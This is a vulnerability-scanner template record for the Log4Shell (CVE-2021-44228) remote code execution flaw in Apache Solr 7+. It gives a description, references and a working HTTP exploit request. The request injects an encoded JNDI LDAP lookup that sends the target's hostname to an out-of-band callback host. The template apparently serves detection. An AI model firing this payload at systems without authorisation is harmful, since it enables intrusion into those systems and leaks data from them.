# Nuclei Template: Apache Solr 7+ - Remote Code Execution (Apache Log4j)
**Template ID:** apache-solr-log4j-rce
**Vulnerability Class:** Code Injection
**Severity:** Critical
**CWE:** CWE-94
**Source:** Nuclei Template (`apache-solr-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints. This vulnerability affects Solr 7+.

## Steps to reproduce / Exploit Payload
```http
@timeout: 25s
GET /solr/admin/{{endpoint}}?action=%24%7Bjndi%3Aldap%3A%2F%2F%24%7B%3A-{{rand1}}%7D%24%7B%3A-{{rand2}}%7D.%24%7BhostName%7D.uri.{{interactsh-url}}%2F%7D HTTP/1.1
Host: {{Hostname}}
```

## References
- https://solr.apache.org/security.html#apache-solr-affected-by-apache-log4j-cve-2021-44228
- https://twitter.com/sirifu4k1/status/1470011568834424837
- https://github.com/apache/solr/pull/454
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
- https://github.com/vulhub/vulhub/tree/master/log4j/CVE-2021-44228
